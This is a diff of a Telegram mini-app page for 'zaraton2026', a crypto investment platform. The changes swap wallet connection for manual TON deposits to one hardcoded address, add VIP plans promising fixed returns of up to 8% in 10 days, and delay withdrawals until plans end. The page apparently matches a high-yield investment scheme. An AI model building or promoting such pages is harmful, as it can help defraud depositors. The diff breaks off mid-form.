@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>zaraton - Investment Platform</title>
+    <title>zaraton2026 - Investment Platform</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="./tonconnect-ui.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;700;900&display=swap');
         
@@ -22,11 +21,7 @@
             --text-secondary: #a0a0c0;
         }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
             font-family: 'Inter', sans-serif;
@@ -35,43 +30,24 @@
             color: var(--text-primary);
             min-height: 100vh;
             overflow-x: hidden;
-            position: relative;
+            padding-bottom: 80px;
         }
 
-        /* Animated background particles */
         .bg-particles {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 0;
-            overflow: hidden;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; z-index: 0; overflow: hidden;
         }
 
         .particle {
-            position: absolute;
-            border-radius: 50%;
-            animation: floatUp 8s infinite ease-in;
-            opacity: 0;
+            position: absolute; border-radius: 50%;
+            animation: floatUp 8s infinite ease-in; opacity: 0;
         }
 
         @keyframes floatUp {
-            0% {
-                transform: translateY(100vh) scale(0);
-                opacity: 0;
-            }
-            10% {
-                opacity: 0.6;
-            }
-            90% {
-                opacity: 0.1;
-            }
-            100% {
-                transform: translateY(-100px) scale(1);
-                opacity: 0;
-            }
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 0.6; }
+            90% { opacity: 0.1; }
+            100% { transform: translateY(-100px) scale(1); opacity: 0; }
         }
 
         .particle:nth-child(1) { left: 10%; width: 4px; height: 4px; background: #3b82f6; animation-delay: 0s; }
@@ -84,617 +60,179 @@
         .particle:nth-child(8) { left: 65%; width: 4px; height: 4px; background: #8b5cf6; animation-delay: 7s; }
 
         .container {
-            position: relative;
-            z-index: 1;
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 16px;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
+            position: relative; z-index: 1; max-width: 500px; margin: 0 auto;
+            padding: 16px; min-height: 100vh;
         }
 
-        /* Hamburger Menu */
-        .hamburger-menu {
-            position: fixed;
-            top: 16px;
-            right: 16px;
-            z-index: 100;
-        }
-
+        /* Hamburger */
+        .hamburger-menu { position: fixed; top: 16px; right: 16px; z-index: 100; }
         .hamburger-btn {
-            width: 44px;
-            height: 44px;
-            border-radius: 12px;
-            background: rgba(26, 26, 46, 0.8);
-            backdrop-filter: blur(10px);
+            width: 44px; height: 44px; border-radius: 12px;
+            background: rgba(26, 26, 46, 0.8); backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-            cursor: pointer;
-            transition: all 0.3s ease;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 5px;
+            cursor: pointer; transition: all 0.3s ease;
         }
+        .hamburger-btn span { display: block; width: 20px; height: 2px; background: #fff; border-radius: 2px; transition: all 0.3s ease; }
+        .hamburger-btn.active span:nth-child(1) { transform: rotate(45deg) translate(5px, 5px); }
+        .hamburger-btn.active span:nth-child(2) { opacity: 0; }
+        .hamburger-btn.active span:nth-child(3) { transform: rotate(-45deg) translate(5px, -5px); }
 
-        .hamburger-btn:hover {
-            background: rgba(59, 130, 246, 0.2);
-            border-color: var(--accent-blue);
-        }
-
-        .hamburger-btn span {
-            display: block;
-            width: 20px;
-            height: 2px;
-            background: #fff;
-            border-radius: 2px;
-            transition: all 0.3s ease;
-        }
-
-        .hamburger-btn.active span:nth-child(1) {
-            transform: rotate(45deg) translate(5px, 5px);
-        }
-
-        .hamburger-btn.active span:nth-child(2) {
-            opacity: 0;
-        }
-
-        .hamburger-btn.active span:nth-child(3) {
-            transform: rotate(-45deg) translate(5px, -5px);
-        }
-
-        /* Side Menu */
         .side-menu-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(4px);
-            z-index: 99;
-            opacity: 0;
-            visibility: hidden;
-            transition: all 0.3s ease;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(4px);
+            z-index: 99; opacity: 0; visibility: hidden; transition: all 0.3s ease;
         }
-
-        .side-menu-overlay.active {
-            opacity: 1;
-            visibility: visible;
-        }
+        .side-menu-overlay.active { opacity: 1; visibility: visible; }
 
         .side-menu {
-            position: fixed;
-            top: 0;
-            right: -300px;
-            width: 280px;
-            height: 100%;
+            position: fixed; top: 0; right: -300px; width: 280px; height: 100%;
             background: linear-gradient(180deg, #1a1a2e 0%, #16213e 100%);
-            z-index: 100;
-            padding: 80px 20px 20px;
-            transition: right 0.3s ease;
-            border-left: 1px solid rgba(255, 255, 255, 0.1);
-            overflow-y: auto;
+            z-index: 100; padding: 80px 20px 20px; transition: right 0.3s ease;
+            border-left: 1px solid rgba(255, 255, 255, 0.1); overflow-y: auto;
         }
-
-        .side-menu.active {
-            right: 0;
-        }
-
-        .side-menu-title {
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            color: var(--text-secondary);
-            margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .side-menu-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 14px;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-bottom: 6px;
-            color: var(--text-primary);
-            text-decoration: none;
-        }
-
-        .side-menu-item:hover {
-            background: rgba(59, 130, 246, 0.15);
-        }
-
-        .side-menu-item.support-item {
-            background: rgba(59, 130, 246, 0.1);
-            border: 1px solid rgba(59, 130, 246, 0.3);
-        }
-
-        .side-menu-item.support-item:hover {
-            background: rgba(59, 130, 246, 0.2);
-        }
-
-        .side-menu-item.history-item {
-            background: rgba(139, 92, 246, 0.1);
-            border: 1px solid rgba(139, 92, 246, 0.3);
-        }
-
-        .side-menu-item.history-item:hover {
-            background: rgba(139, 92, 246, 0.2);
-        }
-
-        .side-menu-icon {
-            font-size: 20px;
-            width: 36px;
-            height: 36px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 10px;
-            background: rgba(255, 255, 255, 0.05);
-            flex-shrink: 0;
-        }
-
-        .side-menu-label {
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .side-menu-arrow {
-            margin-left: auto;
-            font-size: 12px;
-            color: var(--text-secondary);
-        }
+        .side-menu.active { right: 0; }
+        .side-menu-title { font-size: 12px; text-transform: uppercase; letter-spacing: 2px; color: var(--text-secondary); margin-bottom: 15px; padding-bottom: 10px; border-bottom: 1px solid rgba(255, 255, 255, 0.1); }
+        .side-menu-item { display: flex; align-items: center; gap: 12px; padding: 14px; border-radius: 12px; cursor: pointer; transition: all 0.3s ease; margin-bottom: 6px; color: var(--text-primary); text-decoration: none; }
+        .side-menu-item:hover { background: rgba(59, 130, 246, 0.15); }
+        .side-menu-item.support-item { background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.3); }
+        .side-menu-item.faq-item { background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.3); }
+        .side-menu-icon { font-size: 20px; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; border-radius: 10px; background: rgba(255, 255, 255, 0.05); flex-shrink: 0; }
+        .side-menu-label { font-size: 14px; font-weight: 500; }
+        .side-menu-arrow { margin-left: auto; font-size: 12px; color: var(--text-secondary); }
 
         /* Header */
-        .header {
-            text-align: center;
-            padding: 50px 0 20px 0;
-            position: relative;
-        }
-
-        .logo-icon {
-            font-size: 60px;
-            margin-bottom: 15px;
-            animation: diamondFloat 3s ease-in-out infinite;
-            filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.6));
-        }
-
+        .header { text-align: center; padding: 50px 0 20px 0; }
+        .logo-icon { font-size: 50px; margin-bottom: 10px; animation: diamondFloat 3s ease-in-out infinite; filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.6)); }
         @keyframes diamondFloat {
             0%, 100% { transform: translateY(0px) scale(1); filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.6)); }
-            50% { transform: translateY(-12px) scale(1.08); filter: drop-shadow(0 0 35px rgba(255, 215, 0, 0.9)); }
+            50% { transform: translateY(-10px) scale(1.05); filter: drop-shadow(0 0 35px rgba(255, 215, 0, 0.9)); }
         }
-
         .platform-name {
-            font-size: 32px;
-            font-weight: 900;
+            font-size: 28px; font-weight: 900;
             background: linear-gradient(135deg, #ffd700 0%, #ffed4a 30%, #ffd700 50%, #ffaa00 70%, #ffd700 100%);
-            background-size: 200% auto;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            letter-spacing: 3px;
-            animation: shimmer 3s linear infinite;
-            text-shadow: none;
+            background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            background-clip: text; letter-spacing: 3px; animation: shimmer 3s linear infinite;
             filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.4));
         }
+        @keyframes shimmer { 0% { background-position: 0% center; } 100% { background-position: 200% center; } }
+        .subtitle { color: var(--text-secondary); font-size: 12px; margin-top: 4px; font-weight: 300; letter-spacing: 1px; text-transform: uppercase; }
 
-        @keyframes shimmer {
-            0% { background-position: 0% center; }
-            100% { background-position: 200% center; }
-        }
+        /* Pages */
+        .page { display: none; }
+        .page.active { display: block; }
 
-        .subtitle {
-            color: var(--text-secondary);
-            font-size: 13px;
-            margin-top: 6px;
-            font-weight: 300;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-        }
-
-        /* Wallet Section */
-        .wallet-section {
-            background: rgba(26, 26, 46, 0.6);
-            backdrop-filter: blur(20px);
-            border-radius: 20px;
-            padding: 20px;
-            margin-bottom: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-        }
-
-        .wallet-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .wallet-title {
-            font-size: 16px;
-            font-weight: 700;
-            color: #fff;
-        }
-
-        #connect-wallet-btn {
-            background: linear-gradient(135deg, #3b82f6, #2563eb);
-            color: #fff;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 12px;
-            font-family: 'Inter', sans-serif;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-size: 13px;
-            white-space: nowrap;
-            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
-        }
-
-        #connect-wallet-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(59, 130, 246, 0.5);
-        }
-
-        #connect-wallet-btn.connected {
-            background: linear-gradient(135deg, #10b981, #059669);
-            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
-        }
-
-        .wallet-info {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 12px;
-            padding: 15px;
-            margin-top: 10px;
-            display: none;
-        }
-
-        .wallet-info.active {
-            display: block;
-        }
-
-        .wallet-address {
-            color: var(--text-secondary);
-            font-size: 11px;
-            word-break: break-all;
-            background: rgba(0, 0, 0, 0.3);
-            padding: 10px;
-            border-radius: 8px;
-            margin: 10px 0;
-            font-family: monospace;
-            letter-spacing: 0.5px;
-        }
-
-        .balance {
-            font-size: 22px;
-            font-weight: 700;
-            color: var(--accent-green);
-            margin: 8px 0;
-        }
-
-        /* Plans Section */
-        .plans-section {
-            flex: 1;
-        }
-
-        .section-title {
-            font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 20px;
-            text-align: center;
-            position: relative;
-            letter-spacing: 1px;
-        }
-
-        .section-title::after {
-            content: '';
-            display: block;
-            width: 50px;
-            height: 3px;
-            background: linear-gradient(90deg, #ffd700, #ffaa00);
-            margin: 10px auto 0;
-            border-radius: 5px;
-        }
-
-        .plans-grid {
-            display: grid;
-            gap: 14px;
-        }
-
+        /* VIP Cards */
         .vip-card {
-            background: rgba(26, 26, 46, 0.5);
-            backdrop-filter: blur(15px);
-            border-radius: 20px;
-            padding: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
+            background: rgba(26, 26, 46, 0.5); backdrop-filter: blur(15px);
+            border-radius: 20px; padding: 18px; border: 1px solid rgba(255, 255, 255, 0.08);
+            margin-bottom: 12px; position: relative; overflow: hidden;
         }
-
-        .vip-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            border-radius: 3px 3px 0 0;
-        }
-
+        .vip-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; border-radius: 3px 3px 0 0; }
         .vip-1::before { background: linear-gradient(90deg, #3b82f6, #60a5fa); }
         .vip-2::before { background: linear-gradient(90deg, #8b5cf6, #a78bfa); }
         .vip-3::before { background: linear-gradient(90deg, #f59e0b, #fbbf24); }
         .vip-4::before { background: linear-gradient(90deg, #ef4444, #f87171); }
-
-        .vip-card:hover {
-            border-color: rgba(255, 255, 255, 0.2);
-            transform: translateY(-2px);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
-        }
-
-        .vip-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-
-        .vip-badge {
-            font-size: 18px;
-            font-weight: 800;
-            padding: 5px 14px;
-            border-radius: 8px;
-            letter-spacing: 1px;
-        }
-
+        .vip-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        .vip-badge { font-size: 16px; font-weight: 800; padding: 4px 12px; border-radius: 8px; }
         .vip-1 .vip-badge { background: rgba(59, 130, 246, 0.2); color: #60a5fa; }
         .vip-2 .vip-badge { background: rgba(139, 92, 246, 0.2); color: #a78bfa; }
         .vip-3 .vip-badge { background: rgba(245, 158, 11, 0.2); color: #fbbf24; }
         .vip-4 .vip-badge { background: rgba(239, 68, 68, 0.2); color: #f87171; }
-
-        .vip-price {
-            font-size: 22px;
-            font-weight: 800;
-            color: var(--gold);
-        }
-
-        .vip-price span {
-            font-size: 13px;
-            color: var(--text-secondary);
-            font-weight: 400;
-        }
-
-        .vip-features {
-            list-style: none;
-            margin: 15px 0;
-        }
-
-        .vip-features li {
-            color: var(--text-secondary);
-            padding: 4px 0;
-            font-size: 12px;
-        }
-
-        .vip-features li::before {
-            content: '✓ ';
-            color: var(--accent-green);
-            font-weight: bold;
-        }
-
+        .vip-price { font-size: 20px; font-weight: 800; color: var(--gold); }
+        .vip-features { list-style: none; margin: 10px 0; }
+        .vip-features li { color: var(--text-secondary); padding: 2px 0; font-size: 11px; }
+        .vip-features li::before { content: '✓ '; color: var(--accent-green); font-weight: bold; }
         .activate-btn {
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 12px;
-            font-family: 'Inter', sans-serif;
-            font-weight: 700;
-            font-size: 14px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            color: white;
-            letter-spacing: 0.5px;
+            width: 100%; padding: 10px; border: none; border-radius: 10px;
+            font-family: 'Inter', sans-serif; font-weight: 700; font-size: 13px;
+            cursor: pointer; color: white; transition: all 0.3s ease;
         }
-
-        .activate-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
         .vip-1 .activate-btn { background: linear-gradient(135deg, #3b82f6, #2563eb); }
         .vip-2 .activate-btn { background: linear-gradient(135deg, #8b5cf6, #7c3aed); }
         .vip-3 .activate-btn { background: linear-gradient(135deg, #f59e0b, #d97706); }
         .vip-4 .activate-btn { background: linear-gradient(135deg, #ef4444, #dc2626); }
+        .activate-btn.activated { background: #10b981 !important; opacity: 0.7; }
+        .one-time-badge { background: rgba(239, 68, 68, 0.2); color: #ef4444; padding: 2px 6px; border-radius: 5px; font-size: 9px; margin-right: 6px; }
 
-        .activate-btn:active:not(:disabled) {
-            transform: scale(0.97);
-        }
+        /* Wallet Page */
+        .wallet-card { background: rgba(26, 26, 46, 0.5); backdrop-filter: blur(15px); border-radius: 20px; padding: 20px; border: 1px solid rgba(255, 255, 255, 0.08); margin-bottom: 15px; }
+        .wallet-balance { font-size: 32px; font-weight: 900; color: var(--accent-green); text-align: center; margin: 15px 0; }
+        .wallet-address-display { background: rgba(0, 0, 0, 0.3); padding: 12px; border-radius: 10px; font-size: 11px; word-break: break-all; font-family: monospace; margin: 10px 0; }
+        .copy-btn { background: #3b82f6; color: #fff; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-family: 'Inter', sans-serif; font-weight: 600; font-size: 12px; margin: 5px; }
+        .input-field { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid rgba(255, 255, 255, 0.2); background: rgba(0, 0, 0, 0.3); color: #fff; font-family: 'Inter', sans-serif; margin: 8px 0; font-size: 13px; }
+        .action-btn { width: 100%; padding: 12px; border: none; border-radius: 10px; font-family: 'Inter', sans-serif; font-weight: 700; font-size: 14px; cursor: pointer; color: #fff; margin: 5px 0; }
+        .deposit-btn { background: linear-gradient(135deg, #3b82f6, #2563eb); }
+        .withdraw-btn { background: linear-gradient(135deg, #10b981, #059669); }
+        .info-text { font-size: 11px; color: #a0a0c0; margin: 5px 0; line-height: 1.6; }
 
-        .activate-btn.activated {
-            background: #10b981 !important;
-            cursor: not-allowed;
-            opacity: 0.7;
-        }
+        /* Task Page */
+        .task-card { background: rgba(26, 26, 46, 0.5); backdrop-filter: blur(15px); border-radius: 15px; padding: 15px; border: 1px solid rgba(255, 255, 255, 0.08); margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; }
+        .task-info { flex: 1; }
+        .task-title { font-weight: 700; font-size: 14px; margin-bottom: 4px; }
+        .task-reward { color: var(--accent-green); font-size: 12px; }
+        .task-btn { background: #3b82f6; color: #fff; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; font-family: 'Inter', sans-serif; font-weight: 600; font-size: 12px; white-space: nowrap; }
+        .task-btn.done { background: #10b981; }
 
-        .one-time-badge {
-            background: rgba(239, 68, 68, 0.2);
-            color: #ef4444;
-            padding: 3px 8px;
-            border-radius: 6px;
-            font-size: 10px;
-            display: inline-block;
-            margin-right: 8px;
-            font-weight: 600;
-        }
+        /* Referral Page */
+        .ref-card { background: rgba(26, 26, 46, 0.5); backdrop-filter: blur(15px); border-radius: 20px; padding: 20px; border: 1px solid rgba(255, 255, 255, 0.08); margin-bottom: 15px; text-align: center; }
+        .ref-link { background: rgba(0, 0, 0, 0.3); padding: 12px; border-radius: 10px; font-size: 11px; word-break: break-all; margin: 10px 0; }
+        .ref-stats { display: flex; justify-content: space-around; margin: 15px 0; }
+        .ref-stat { text-align: center; }
+        .ref-stat-number { font-size: 24px; font-weight: 900; color: var(--gold); }
+        .ref-stat-label { font-size: 11px; color: var(--text-secondary); }
 
-        /* History Panel in Side Menu */
-        .history-panel {
-            display: none;
-            margin-top: 10px;
-        }
+        /* FAQ */
+        .faq-item { background: rgba(26, 26, 46, 0.5); border-radius: 12px; padding: 15px; margin-bottom: 10px; border: 1px solid rgba(255, 255, 255, 0.08); }
+        .faq-question { font-weight: 700; font-size: 14px; margin-bottom: 8px; color: var(--gold); }
+        .faq-answer { font-size: 12px; color: var(--text-secondary); line-height: 1.8; }
 
-        .history-panel.active {
-            display: block;
+        /* Bottom Nav */
+        .bottom-nav {
+            position: fixed; bottom: 0; left: 0; right: 0; z-index: 50;
+            background: rgba(15, 15, 26, 0.95); backdrop-filter: blur(20px);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex; justify-content: space-around; padding: 8px 0 12px;
         }
-
-        .history-mini-item {
-            background: rgba(0, 0, 0, 0.2);
-            padding: 10px;
-            border-radius: 8px;
-            margin: 6px 0;
-            font-size: 11px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .history-mini-plan {
-            color: var(--gold);
-            font-weight: 600;
-        }
-
-        .history-mini-amount {
-            color: var(--accent-green);
-        }
+        .nav-item { text-align: center; cursor: pointer; color: var(--text-secondary); transition: all 0.3s ease; padding: 5px 10px; }
+        .nav-item.active { color: var(--accent-blue); }
+        .nav-item.active .nav-icon { background: rgba(59, 130, 246, 0.2); }
+        .nav-icon { font-size: 20px; width: 44px; height: 36px; display: flex; align-items: center; justify-content: center; border-radius: 10px; margin: 0 auto 2px; transition: all 0.3s ease; }
+        .nav-label { font-size: 10px; font-weight: 600; }
 
         /* Modal */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.85);
-            z-index: 200;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .modal.active {
-            display: flex;
-        }
-
-        .modal-content {
-            background: #1a1a2e;
-            border-radius: 20px;
-            padding: 30px;
-            max-width: 350px;
-            width: 90%;
-            text-align: center;
-            border: 1px solid rgba(255, 215, 0, 0.3);
-            animation: modalSlide 0.3s ease-out;
-        }
-
-        @keyframes modalSlide {
-            from { transform: translateY(20px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-
-        .modal-icon {
-            font-size: 50px;
-            margin-bottom: 15px;
-        }
-
-        .modal h3 {
-            font-size: 18px;
-            margin-bottom: 10px;
-        }
-
-        .modal p {
-            color: var(--text-secondary);
-            margin-bottom: 20px;
-            font-size: 13px;
-            line-height: 1.6;
-        }
-
-        .close-modal-btn {
-            background: linear-gradient(135deg, #3b82f6, #2563eb);
-            color: #fff;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 12px;
-            font-family: 'Inter', sans-serif;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .close-modal-btn:hover {
-            box-shadow: 0 5px 20px rgba(59, 130, 246, 0.4);
-        }
-
-        .loading-spinner {
-            display: none;
-            width: 36px;
-            height: 36px;
-            border: 3px solid rgba(255, 255, 255, 0.1);
-            border-top-color: #3b82f6;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-            margin: 15px auto;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .loading-spinner.active {
-            display: block;
-        }
+        .modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.85); z-index: 200; align-items: center; justify-content: center; }
+        .modal.active { display: flex; }
+        .modal-content { background: #1a1a2e; border-radius: 20px; padding: 25px; max-width: 350px; width: 90%; text-align: center; border: 1px solid rgba(255, 215, 0, 0.3); animation: modalSlide 0.3s ease-out; }
+        @keyframes modalSlide { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .modal-icon { font-size: 40px; margin-bottom: 10px; }
+        .modal h3 { font-size: 16px; margin-bottom: 8px; }
+        .modal p { color: var(--text-secondary); margin-bottom: 15px; font-size: 12px; line-height: 1.6; }
+        .modal-btn { background: #3b82f6; color: #fff; border: none; padding: 10px 25px; border-radius: 10px; font-family: 'Inter', sans-serif; font-weight: 600; cursor: pointer; margin: 4px; font-size: 13px; }
+        .modal-btn.green { background: #10b981; }
+        .modal-btn.gray { background: #666; }
     </style>
 </head>
 <body>
-    <!-- Animated Background Particles -->
     <div class="bg-particles">
-        <div class="particle"></div>
-        <div class="particle"></div>
-        <div class="particle"></div>
-        <div class="particle"></div>
-        <div class="particle"></div>
-        <div class="particle"></div>
-        <div class="particle"></div>
-        <div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div><div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div><div class="particle"></div><div class="particle"></div>
     </div>
 
-    <!-- Hamburger Menu Button -->
+    <!-- Hamburger -->
     <div class="hamburger-menu">
         <div class="hamburger-btn" id="hamburger-btn" onclick="toggleMenu()">
-            <span></span>
-            <span></span>
-            <span></span>
+            <span></span><span></span><span></span>
         </div>
     </div>
-
-    <!-- Side Menu Overlay -->
     <div class="side-menu-overlay" id="side-menu-overlay" onclick="toggleMenu()"></div>
-
-    <!-- Side Menu -->
     <div class="side-menu" id="side-menu">
         <div class="side-menu-title">Menu</div>
-        
         <a class="side-menu-item support-item" href="https://t.me/zaraton2026" target="_blank">
-            <span class="side-menu-icon">💬</span>
-            <span class="side-menu-label">Support</span>
-            <span class="side-menu-arrow">↗</span>
+            <span class="side-menu-icon">💬</span><span class="side-menu-label">Support</span><span class="side-menu-arrow">↗</span>
         </a>
-        
-        <div class="side-menu-item history-item" onclick="toggleHistoryPanel()">
-            <span class="side-menu-icon">📊</span>
-            <span class="side-menu-label">History</span>
-            <span class="side-menu-arrow" id="history-arrow">▼</span>
-        </div>
-        
-        <div class="history-panel" id="history-panel">
-            <div id="history-mini-container">
-                <p style="color: #a0a0c0; text-align: center; font-size: 11px;">No transactions yet</p>
-            </div>
+        <div class="side-menu-item faq-item" onclick="openFAQ()">
+            <span class="side-menu-icon">❓</span><span class="side-menu-label">FAQ</span><span class="side-menu-arrow">→</span>
         </div>
     </div>
 
@@ -706,433 +244,310 @@
             <p class="subtitle">VIP Investment Platform</p>
         </div>
 
-        <!-- Wallet Connection -->
-        <div class="wallet-section">
-            <div class="wallet-header">
-                <span class="wallet-title">🔗 Wallet</span>
-                <button id="connect-wallet-btn" onclick="handleWalletConnection()">Connect Tonkeeper</button>
+        <!-- ========== HOME PAGE ========== -->
+        <div class="page active" id="page-home">
+            <div class="vip-card vip-1" id="vip1-card">
+                <div class="vip-header"><span class="vip-badge">VIP 1</span><span class="vip-price">10 <span style="font-size:12px;color:#a0a0c0;">TON</span></span></div>
+                <ul class="vip-features"><li>Monthly profit 2%</li><li>Investment period: 30 days</li><li>Standard support</li></ul>
+                <button class="activate-btn" id="vip1-btn" onclick="buyPlan(1)"><span class="one-time-badge">Only Once</span>Buy VIP 1</button>
             </div>
-            <div id="wallet-info" class="wallet-info">
-                <div style="font-size: 11px; color: #a0a0c0;">Wallet Address:</div>
-                <div id="wallet-address" class="wallet-address">---</div>
-                <div class="balance" id="wallet-balance">0.00 TON</div>
+            <div class="vip-card vip-2" id="vip2-card">
+                <div class="vip-header"><span class="vip-badge">VIP 2</span><span class="vip-price">25 <span style="font-size:12px;color:#a0a0c0;">TON</span></span></div>
+                <ul class="vip-features"><li>20-day profit 4%</li><li>Investment period: 20 days</li><li>VIP support</li><li>Instant withdrawal</li></ul>
+                <button class="activate-btn" id="vip2-btn" onclick="buyPlan(2)">Buy VIP 2</button>
             </div>
-            <div class="loading-spinner" id="loading-spinner"></div>
+            <div class="vip-card vip-3" id="vip3-card">
+                <div class="vip-header"><span class="vip-badge">VIP 3</span><span class="vip-price">50 <span style="font-size:12px;color:#a0a0c0;">TON</span></span></div>
+                <ul class="vip-features"><li>15-day profit 6%</li><li>Investment period: 15 days</li><li>24/7 support</li><li>Instant withdrawal</li><li>Monthly rewards</li></ul>
+                <button class="activate-btn" id="vip3-btn" onclick="buyPlan(3)">Buy VIP 3</button>
+            </div>
+            <div class="vip-card vip-4" id="vip4-card">
+                <div class="vip-header"><span class="vip-badge">VIP 4</span><span class="vip-price">100 <span style="font-size:12px;color:#a0a0c0;">TON</span></span></div>
+                <ul class="vip-features"><li>10-day profit 8%</li><li>Investment period: 10 days</li><li>Dedicated support</li><li>Instant withdrawal</li><li>Weekly rewards</li><li>Investment consultation</li></ul>
+                <button class="activate-btn" id="vip4-btn" onclick="buyPlan(4)">Buy VIP 4</button>
+            </div>
         </div>
 
-        <!-- Investment Plans -->
-        <div class="plans-section">
-            <h2 class="section-title">💰 Investment Plans</h2>
-            <div class="plans-grid">
-                <!-- VIP 1 -->
-                <div class="vip-card vip-1" id="vip1-card">
-                    <div class="vip-header">
-                        <span class="vip-badge">VIP 1</span>
-                        <span class="vip-price">10 <span>TON</span></span>
-                    </div>
-                    <ul class="vip-features">
-                        <li>Monthly profit 2%</li>
-                        <li>Investment period: 30 days</li>
-                        <li>Standard support</li>
-                    </ul>
-                    <button class="activate-btn" id="vip1-btn" onclick="activatePlan(1)">
-                        <span class="one-time-badge">Only Once</span>
-                        Activate VIP 1
-                    </button>
-                </div>
+        <!-- ========== WALLET PAGE ========== -->
+        <div class="page" id="page-wallet">
+            <div class="wallet-card">
+                <h3>💰 Balance</h3>
+                <div class="wallet-balance" id="user-balance">0.00 TON</div>
+                <p class="info-text">Available for withdrawal after plan completion</p>
+            </div>
+            <div class="wallet-card">
+                <h3>📥 Deposit</h3>
+                <p class="info-text">Send TON to this address with your Telegram UID in the comment:</p>
+                <div class="wallet-address-display" id="deposit-address">UQDxPjlH5H0zwvE6sEzAo_VaL-i7rys77iiZDoA0DaD_i7LZ</div>
+                <button class="copy-btn" onclick="copyDepositAddress()">📋 Copy Address</button>
+                <p class="info-text" style="margin-top:10px;">Your UID: <strong id="user-uid">Loading...</strong></p>
+                <p class="info-text">⚠️ You MUST include your UID in the transaction comment, or your deposit won't be credited.</p>
+                <a href="https://t.me/TonVaultVerifyBot" target="_blank"><button class="action-btn deposit-btn">🤖 Verify Deposit with Bot</button></a>
+            </div>
+            <div class="wallet-card">
+                <h3>📤 Withdraw</h3>
+                <p class="info-text">Withdrawal is only available after your plan period ends.</p>
+                <input class="input-field" type="text" placeholder="Your TON wallet address" id="withdraw-address">
+                <input class="input-field" type="number" placeholder="Amount (TON)" id="withdraw-amount">
+                <button class="action-btn withdraw-btn" onclick="requestWithdraw()">Request Withdrawal</button>
